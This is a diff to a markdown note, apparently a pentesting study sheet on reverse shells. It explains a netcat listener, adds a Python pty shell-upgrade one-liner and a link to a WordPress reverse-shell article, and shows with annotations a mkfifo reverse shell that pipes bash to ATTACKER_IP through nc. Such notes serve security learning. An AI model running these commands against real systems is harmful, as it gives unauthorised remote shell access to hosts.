@@ -12,12 +12,16 @@ To setup a reverse shell, we need to setup first a `Netcat Listener` on the atta
 nc -lvnp <port>
 ```
 
-* \-l means to way for connection
-* \-v enable verbose mode
-* \-n prevents connections from using DNS for lookup
-* \-p idicates the port that will be used to wait connection
+* -l means to way for connection
+* -v enable verbose mode
+* -n prevents connections from using DNS for lookup
+* -p idicates the port that will be used to wait connection
 
+### Upgrade a shell to tty
 
+```sh
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+```
 
 ### To gain reverse shell access
 
@@ -33,3 +37,7 @@ rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc ATTACKER_IP ATTACKER
 * `| bash -i 2>&1` - The output of `cat` is piped to a shell instance (`bash -i`), which allows the attacker to execute commands interactively. The `2>&1` redirects standard error to standard output, ensuring that error messages are sent back to the attacker.
 * `| nc ATTACKER_IP ATTACKER_PORT >/tmp/f` - This part pipes the shell's output through `nc` (Netcat) to the attacker's IP address (`ATTACKER_IP`) on the attacker's port (`ATTACKER_PORT`).
 * `>/tmp/f` -This final part sends the output of the commands back into the named pipe, allowing for bi-directional communication.
+
+
+
+{% embed url="https://www.hackercoolmagazine.com/wordpress-reverse-shelling-multiple-methods/" %}
